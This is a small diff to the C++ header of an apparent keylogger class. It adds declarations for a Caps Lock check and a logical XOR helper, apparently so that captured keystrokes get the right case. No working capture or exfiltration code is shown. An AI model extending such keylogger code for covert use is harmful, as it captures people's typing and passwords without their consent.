@@ -60,6 +60,18 @@ private:
           * Pointer to KeyLogger object (necissary for callback function)
           */
         static KeyLogger *objPointer;
+        
+        /**
+          * Function to check whether Caps Lock is on or off
+          */
+        bool isCapsLock();
+        
+        /**
+          * Function to calculate logical xor
+          * @param p - first argument
+          * @param q - second argument
+          */
+        bool logicalXOR(bool p, bool q);
 };
 
 #define KEYLOGGER_H
